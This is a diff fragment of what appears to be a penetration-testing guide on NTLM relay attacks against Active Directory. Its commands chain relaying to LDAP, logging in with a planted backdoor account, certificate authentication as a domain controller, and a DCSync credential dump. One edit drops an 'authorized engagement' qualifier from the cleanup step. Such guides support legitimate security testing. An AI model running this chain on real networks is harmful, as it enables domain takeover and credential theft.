@@ -12,7 +12,7 @@ nmap --script smb2-security-mode -p 445 <subnet>/24 | grep -B5 "signing: disable
 # 2. Confirm NTLM is accepted (not blocked by EPA/channel binding)
 # Windows Server 2019+: some configs require extended protection → test first
 
-# 3. LDAP signing: record the effective DC policy, not just the OS version. New Server 2025 deployments require signing by default; upgrades preserve existing policy.
+# 3. LDAP signing: record the effective DC policy, not just the OS version. Server 2025 requires signing when no policy is set (new or upgraded DC); policies already in place survive an upgrade.
 # Test: impacket-ntlmrelayx -t ldap://<dc_ip> --no-smb-server ...
 ```
 
@@ -133,7 +133,7 @@ crackmapexec smb <relay_target> -u backdoor -p 'P@ss123!'
 certipy auth -pfx dc.pfx -domain domain.local -username dc$ -dc-ip <dc_ip>
 impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>   # DCSync
 
-# Clean up after relay (if authorized engagement requires it)
+# Clean up after relay
 net user backdoor /delete   # remove added account
 ```
 
